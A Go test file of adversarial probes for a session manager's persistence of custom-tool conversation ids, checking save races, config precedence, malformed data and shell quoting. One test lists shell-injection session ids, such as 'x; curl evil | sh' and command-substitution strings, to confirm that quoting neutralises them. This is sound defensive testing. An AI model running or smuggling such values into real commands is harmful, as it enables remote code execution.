package session

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"al.essio.dev/pkg/shellescape"
	"github.com/asheshgoplani/agent-deck/internal/statedb"
)

// Adversarial probes for PR #1885 (persist custom-tool conversation ids).

// TestAttack_ClearedFlagConsumedAfterSave is the concurrent-writer sticky hole:
// after SetField(clear) + Save, genericSessionIDCleared must not remain true.
// Otherwise a later unrelated Save from the same in-memory Instance re-emits
// intentional clear and wipes a concurrent WriteGenericSessionBinding.
func TestAttack_ClearedFlagConsumedAfterSave(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)

	inst := NewInstance("clear-consume", "/tmp/clear-consume")
	inst.ID = "clear-consume"
	inst.Tool = "shell"
	inst.GenericSessionID = "first-id"
	inst.GenericDetectedAt = time.Now()
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}

	if _, _, err := SetField(inst, FieldToolSessionID, "", nil); err != nil {
		t.Fatal(err)
	}
	if !inst.genericSessionIDCleared {
		t.Fatal("SetField clear must set genericSessionIDCleared")
	}
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}
	if inst.genericSessionIDCleared {
		t.Fatal("genericSessionIDCleared must be consumed after successful save")
	}

	// Concurrent writer re-binds while this process still holds the empty in-memory snapshot.
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "new-id", inst.Tool, inst.Command, LocationOf(inst).String(), time.Now()); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded[0].GenericSessionID != "new-id" {
		t.Fatalf("concurrent bind lost: %q", loaded[0].GenericSessionID)
	}

	// Unrelated full save from stale empty snapshot must sticky-preserve new-id.
	inst.Title = "renamed-after-clear"
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}
	loaded2, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if got := loaded2[0].GenericSessionID; got != "new-id" {
		t.Fatalf("stale post-clear save wiped concurrent binding: got %q want new-id", got)
	}
}

// TestAttack_BashLcShellInjection proves formatGenericResumeCommand + bash -lc
// keep hostile session ids as a single argv (no injection).
func TestAttack_BashLcShellInjection(t *testing.T) {
	hostile := []string{
		"x; curl evil | sh",
		"$(whoami)",
		"id with spaces",
		"id'quote",
		"id`id`",
		"evil;id",
		"ok\nid",
		`id"; curl evil; echo "`,
		`id'; curl evil; #`,
		"$(echo PWNED)",
	}
	for i, sid := range hostile {
		name := "h" + string(rune('a'+i))
		t.Run("space_"+name, func(t *testing.T) {
			assertBashLcArgv(t, "--resume", sid)
		})
		t.Run("equals_"+name, func(t *testing.T) {
			assertBashLcArgv(t, "--session=", sid)
		})
	}
}

func assertBashLcArgv(t *testing.T, flag, sid string) {
	t.Helper()
	cmdStr := formatGenericResumeCommand("_tool", flag, sid, "")
	// Null-delimited argv dump so we can DeepEqual complete arguments
	// (CodeRabbit: partial "starts with --session=" is too weak).
	full := `_tool(){ printf '%s\0' "$@"; }; ` + cmdStr
	// Output(), not CombinedOutput(): `bash -lc` is a LOGIN shell and sources
	// profile scripts, so anything they print to stderr would land in the
	// NUL-delimited argv dump this test parses and read as an injection defect
	// rather than an environment one.
	out, err := exec.Command("bash", "-lc", full).Output()
	if err != nil {
		t.Fatalf("bash -lc failed: %v\ncmd=%q\nout=%s", err, cmdStr, out)
	}
	raw := string(out)
	// Drop trailing empty from final NUL
	parts := strings.Split(strings.TrimSuffix(raw, "\x00"), "\x00")
	if len(parts) == 1 && parts[0] == "" {
		parts = nil
	}
	var want []string
	if strings.HasSuffix(flag, "=") {
		want = []string{flag + sid}
	} else {
		want = []string{flag, sid}
	}
	if len(parts) != len(want) {
		t.Fatalf("argv count=%d want %d\nparts=%q\ncmd=%q", len(parts), len(want), parts, cmdStr)
	}
	for i := range want {
		if parts[i] != want[i] {
			t.Fatalf("argv[%d]=%q want %q\nall=%q\ncmd=%q", i, parts[i], want[i], parts, cmdStr)
		}
	}
	if strings.Contains(sid, "PWNED") && strings.Contains(raw, "PWNED") && !strings.Contains(cmdStr, "$(echo PWNED)") {
		// PWNED may appear only as literal payload in argv, not as expansion result alone
		if !strings.Contains(cmdStr, shellescape.Quote(sid)) && strings.ContainsAny(sid, "$(`") {
			t.Fatalf("command substitution may have executed:\n%s", raw)
		}
	}
	if strings.ContainsAny(sid, ";$`\n'\"") {
		if !strings.Contains(cmdStr, shellescape.Quote(sid)) {
			t.Fatalf("hostile id not shellescape-quoted: cmd=%q", cmdStr)
		}
	}
}

// TestAttack_StickyVsClearContracts hits design contracts 1–3.
func TestAttack_StickyVsClearContracts(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)

	inst := NewInstance("sticky-contract", "/tmp")
	inst.ID = "sticky-contract"
	inst.Tool = "shell"
	inst.GenericSessionID = "bind-A"
	inst.GenericDetectedAt = time.Now()
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}

	// (1) Sticky: full save with empty id + cleared=false preserves A.
	stale := NewInstance("sticky-contract", "/tmp")
	stale.ID = inst.ID
	stale.Tool = "shell"
	stale.GenericSessionID = ""
	stale.genericSessionIDCleared = false
	if err := storage.SaveWithGroups([]*Instance{stale}, NewGroupTreeWithGroups([]*Instance{stale}, nil)); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded[0].GenericSessionID != "bind-A" {
		t.Fatalf("sticky failed: %q", loaded[0].GenericSessionID)
	}

	// (2) Intentional clear sticks across reload.
	live := loaded[0]
	if _, _, err := SetField(live, FieldToolSessionID, "", nil); err != nil {
		t.Fatal(err)
	}
	if err := storage.SaveWithGroups([]*Instance{live}, NewGroupTreeWithGroups([]*Instance{live}, nil)); err != nil {
		t.Fatal(err)
	}
	loaded2, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded2[0].GenericSessionID != "" {
		t.Fatalf("clear did not stick: %q", loaded2[0].GenericSessionID)
	}
}

// TestAttack_BuiltinClaudeNoGenericResume — design contract 6.
func TestAttack_BuiltinClaudeNoGenericResume(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "not-claude", "--resume")
	if GetToolDef("claude") != nil {
		t.Fatal("GetToolDef(claude) must be nil")
	}
	inst := &Instance{
		Tool:             "claude",
		Command:          "claude",
		ClaudeSessionID:  "claude-real",
		GenericSessionID: "accidental-generic",
	}
	if inst.CanRestartGeneric() {
		t.Fatal("CanRestartGeneric must be false for builtin claude")
	}
	cmd := inst.buildGenericCommand("claude")
	if strings.Contains(cmd, "accidental-generic") {
		t.Fatalf("must not inject accidental generic id: %q", cmd)
	}
	if got := inst.DisplaySessionID(); got != "claude-real" {
		t.Fatalf("DisplaySessionID = %q, want claude-real", got)
	}
}

// TestAttack_WhitespaceOnlyNoResume — attack list #8.
func TestAttack_WhitespaceOnlyNoResume(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "fake-tool", "--resume")
	for _, sid := range []string{"", "   ", "\t\n"} {
		inst := &Instance{Tool: "fake-tool", Command: "fake-tool", GenericSessionID: sid}
		if inst.GetGenericSessionID() != "" {
			t.Fatalf("sid=%q GetGenericSessionID=%q", sid, inst.GetGenericSessionID())
		}
		if inst.CanRestartGeneric() {
			t.Fatalf("sid=%q CanRestartGeneric true", sid)
		}
		cmd := inst.buildGenericCommand("fake-tool")
		if strings.Contains(cmd, "--resume") {
			t.Fatalf("sid=%q injected resume: %q", sid, cmd)
		}
	}
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)
	inst := NewInstance("ws-db", "/tmp")
	inst.ID = "ws-db"
	inst.Tool = "shell"
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "   ", inst.Tool, inst.Command, LocationOf(inst).String(), time.Now()); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded[0].GetGenericSessionID() != "" {
		t.Fatalf("whitespace binding must trim to empty, got %q", loaded[0].GetGenericSessionID())
	}
}

// TestAttack_MalformedToolDataNoPanic — non-string generic_session_id.
func TestAttack_MalformedToolDataNoPanic(t *testing.T) {
	cases := []json.RawMessage{
		json.RawMessage(`{"generic_session_id":123}`),
		json.RawMessage(`{"generic_session_id":true}`),
		json.RawMessage(`{"generic_session_id":null}`),
		json.RawMessage(`{"generic_session_id":["a"]}`),
		json.RawMessage(`{"generic_session_id":{"x":1}}`),
	}
	for _, td := range cases {
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("panic on %s: %v", td, r)
				}
			}()
			_ = ReadGenericSessionIDFromToolData(td)
			_ = ReadGenericDetectedAtFromToolData(td)
		}()
	}
}

// TestAttack_TwoSeatsIndependentAfterLoad — attack list #10.
func TestAttack_TwoSeatsIndependentAfterLoad(t *testing.T) {
	home := isolateToolConfigHome(t)
	writeResumeToolConfig(t, home, "shared-cli", "--resume")
	storage := newTestStorage(t)
	proj := filepath.Join(home, "proj")
	_ = os.MkdirAll(proj, 0o700)

	a := NewInstance("seat-a", proj)
	a.ID = "seat-a"
	a.Tool = "shared-cli"
	a.Command = "shared-cli"
	a.GenericSessionID = "id-A"
	a.GenericDetectedAt = time.Now()

	b := NewInstance("seat-b", proj)
	b.ID = "seat-b"
	b.Tool = "shared-cli"
	b.Command = "shared-cli"
	b.GenericSessionID = "id-B"
	b.GenericDetectedAt = time.Now()

	if err := storage.SaveWithGroups([]*Instance{a, b}, NewGroupTreeWithGroups([]*Instance{a, b}, nil)); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	byID := map[string]*Instance{}
	for _, inst := range loaded {
		inst.tmuxSession = nil
		byID[inst.ID] = inst
	}
	ca := byID["seat-a"].buildGenericCommand("shared-cli")
	cb := byID["seat-b"].buildGenericCommand("shared-cli")
	if strings.Contains(ca, "id-B") || strings.Contains(cb, "id-A") {
		t.Fatalf("cross-talk ca=%q cb=%q", ca, cb)
	}
	if !strings.Contains(ca, "id-A") || !strings.Contains(cb, "id-B") {
		t.Fatalf("missing ids ca=%q cb=%q", ca, cb)
	}
}

// TestAttack_PersistNilSafeAndSiblings.
func TestAttack_PersistNilSafeAndSiblings(t *testing.T) {
	if err := PersistGenericSessionBinding(nil, nil); err != nil {
		t.Fatal(err)
	}
	if err := PersistGenericSessionBinding(nil, &Instance{ID: "x"}); err != nil {
		t.Fatal(err)
	}

	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)
	inst := NewInstance("sib", "/tmp")
	inst.ID = "sib"
	inst.Tool = "claude"
	inst.ClaudeSessionID = "claude-keep"
	inst.Color = "#abc"
	if err := storage.SaveWithGroups([]*Instance{inst}, NewGroupTreeWithGroups([]*Instance{inst}, nil)); err != nil {
		t.Fatal(err)
	}
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "g1", inst.Tool, inst.Command, LocationOf(inst).String(), time.Now()); err != nil {
		t.Fatal(err)
	}
	if err := storage.db.WriteGenericSessionBinding(inst.ID, "", inst.Tool, inst.Command, LocationOf(inst).String(), time.Time{}); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	if loaded[0].GenericSessionID != "" {
		t.Fatalf("generic not cleared: %q", loaded[0].GenericSessionID)
	}
	if loaded[0].ClaudeSessionID != "claude-keep" {
		t.Fatalf("claude clobbered: %q", loaded[0].ClaudeSessionID)
	}
	if loaded[0].Color != "#abc" {
		t.Fatalf("color clobbered: %q", loaded[0].Color)
	}
}

// TestAttack_JSONRoundTripSpecialChars through tool_data.
func TestAttack_JSONRoundTripSpecialChars(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	storage := newTestStorage(t)
	ids := []string{
		`id"with"quotes`,
		`id\with\backslashes`,
		`unicode-日本語`,
		`emoji-🔐`,
	}
	var instances []*Instance
	for i, id := range ids {
		inst := NewInstance("j", "/tmp")
		inst.ID = "j" + string(rune('0'+i))
		inst.Tool = "shell"
		inst.GenericSessionID = id
		inst.GenericDetectedAt = time.Now()
		instances = append(instances, inst)
	}
	if err := storage.SaveWithGroups(instances, NewGroupTreeWithGroups(instances, nil)); err != nil {
		t.Fatal(err)
	}
	loaded, _, err := storage.LoadWithGroups()
	if err != nil {
		t.Fatal(err)
	}
	byID := map[string]string{}
	for _, inst := range loaded {
		byID[inst.ID] = inst.GenericSessionID
	}
	for i, id := range ids {
		key := "j" + string(rune('0'+i))
		if byID[key] != id {
			t.Fatalf("%s: want %q got %q", key, id, byID[key])
		}
	}
}

// TestAttack_ExplicitClearMergeUnit — sticky honors explicit empty.
func TestAttack_ExplicitClearMergeUnit(t *testing.T) {
	old := json.RawMessage(`{"generic_session_id":"keep","color":"#x"}`)
	new_ := WriteGenericSessionIDToToolData(json.RawMessage(`{"color":"#x"}`), "", time.Time{}, true)
	merged := statedb.MergeToolDataExtras(old, new_)
	if got := ReadGenericSessionIDFromToolData(merged); got != "" {
		t.Fatalf("explicit clear must win: %s", merged)
	}
}

// TestAttack_UnknownToolNoPanic — no resume_flag / unknown name must not panic.
func TestAttack_UnknownToolNoPanic(t *testing.T) {
	isolateConfigRoots(t) // no host config can invent this tool
	inst := &Instance{Tool: "no-such-tool-xyz", Command: "no-such-tool-xyz", GenericSessionID: "sid"}
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("panic: %v", r)
		}
	}()
	if inst.CanRestartGeneric() {
		t.Fatal("unknown tool CanRestartGeneric")
	}
	cmd := inst.buildGenericCommand("no-such-tool-xyz")
	if strings.Contains(cmd, "--resume") {
		t.Fatalf("resume on unknown tool: %q", cmd)
	}
}

// TestAttack_ConfigIsolationXDGWinsOverLegacy documents attack #4: when both
// XDG and ~/.agent-deck configs exist, XDG resume_flag wins.
func TestAttack_ConfigIsolationXDGWinsOverLegacy(t *testing.T) {
	home, xdgConfig, _, _ := isolateConfigRoots(t)
	writeConfigAt(t, xdgAgentDeckConfigDir(xdgConfig), `
[tools.dual]
command = "dual"
resume_flag = "--from-xdg"
`)
	writeConfigAt(t, legacyAgentDeckConfigDir(home), `
[tools.dual]
command = "dual"
resume_flag = "--from-legacy"
`)
	ClearUserConfigCache()
	def := GetToolDef("dual")
	if def == nil {
		t.Fatal("GetToolDef nil")
	}
	if def.ResumeFlag != "--from-xdg" {
		t.Fatalf("when both configs exist, XDG must win: got %q", def.ResumeFlag)
	}
	inst := &Instance{Tool: "dual", Command: "dual", GenericSessionID: "s"}
	cmd := inst.buildGenericCommand("dual")
	if !strings.Contains(cmd, "--from-xdg") {
		t.Fatalf("cmd=%q", cmd)
	}
	if strings.Contains(cmd, "--from-legacy") {
		t.Fatalf("legacy flag leaked: %q", cmd)
	}
}

// TestAttack_NoResumeFlagNoInject — custom tool without resume_flag must not
// inject resume argv even with a persisted GenericSessionID.
func TestAttack_NoResumeFlagNoInject(t *testing.T) {
	home, xdgConfig, _, _ := isolateConfigRoots(t)
	// Prefer XDG path; write only there so AGENTDECK_PROFILE / legacy cannot
	// resurrect a resume_flag from host config.
	writeConfigAt(t, xdgAgentDeckConfigDir(xdgConfig), `
[tools.noflag]
command = "noflag"
`)
	_ = home
	ClearUserConfigCache()
	inst := &Instance{Tool: "noflag", Command: "noflag", GenericSessionID: "present"}
	if inst.CanRestartGeneric() {
		t.Fatal("CanRestartGeneric without resume_flag")
	}
	cmd := inst.buildGenericCommand("noflag")
	// Fail if the session id leaked into the command in any form.
	if strings.Contains(cmd, "present") {
		t.Fatalf("generic session ID leaked into command: %q", cmd)
	}
	if strings.Contains(cmd, "--resume") {
		t.Fatalf("injected --resume without resume_flag: %q", cmd)
	}
}
